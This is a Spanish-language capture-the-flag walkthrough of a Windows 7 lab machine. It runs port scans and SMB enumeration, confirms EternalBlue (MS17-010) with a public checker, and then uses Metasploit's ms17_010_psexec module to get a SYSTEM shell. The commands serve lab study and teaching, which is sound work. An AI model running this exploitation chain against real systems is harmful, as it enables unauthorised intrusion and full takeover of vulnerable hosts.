
```shell
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.129.58.162 -oG allPorts
```

Encontramos los puertos `135`, `139`, `445`, `49152`, `49153`, `49154`, `49155`, `49156`, `49157` sobre los que haremos un escaneo exhaustivo con [[NMAP]]
```shell
nmap -p135,139,445,49152,49153,49154,49155,49156,49157 -sCV 10.129.58.162 -oN targeted
```

Vemos que es un Windows 7, enumeraremos el servicio *SMB* usando [[NETEXEC]]
```Shell
nxc smb 10.129.58.162
```

![[Pasted image 20260916124142.png]]

Vemos que esta habilitado el *SMBv1* y que el dominio es `HARIS-PC`
Al ser un equipo tan antiguo enumeraremos con los scripts de [[NMAP]]
```shell
nmap -p445 --script "vuln and safe" 10.129.58.162 -oN smbScan
```
![[Pasted image 20260916124749.png]]

Identificamos que la maquina es vulnerable a *EternalBlue*, validaremos con el checker si se puede explotar de alguna forma usando el repositorio de github [[https://github.com/worawit/ms17-010]] 
```Shell
python2 checker.py 10.129.58.162
```
![[Pasted image 20260916125239.png]]

Al darnos al inicio que todos son accesos denegados deberemos de modificar el archivo y añadir en el campo de USERNAME *guest*
Volveremos a ejecutar el script
![[Pasted image 20260916125529.png]]

Hemos obtenido diferentes named pipes del que nos podemos aprovechar y obtener *RCE*
Ahora con [[METASPLOIT]] podemos explotarlo
```shell
msfconsole
```

Usaremos el exploit de `windows/smb/ms17_010_psexec`
```shell
use windows/smb/ms17_010_psexec
```

Ajustaremos el `RHOST`, el `LHOST` y `SMBUSer` al ejecutarlo obtendremos una shell como *NTAUTHORITY SYSTEM* pudiendo acceder a todas las flags

